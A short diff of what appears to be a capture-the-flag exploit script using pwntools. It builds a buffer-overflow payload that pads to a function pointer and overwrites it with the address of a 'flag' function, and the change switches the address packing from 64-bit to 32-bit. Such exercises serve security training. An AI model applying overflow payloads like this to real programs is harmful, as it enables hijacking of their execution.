@@ -13,7 +13,7 @@ fp = gen_names["fp"]
 
 payload = b''
 payload += (gen_var_locations[fp][-1] - gen_var_locations[buff][-1]) * b'a'
-payload += p64(e.symbols['flag'])
+payload += p32(e.symbols['flag'])
 p.sendline(payload)
 
 print(p.readlineS())
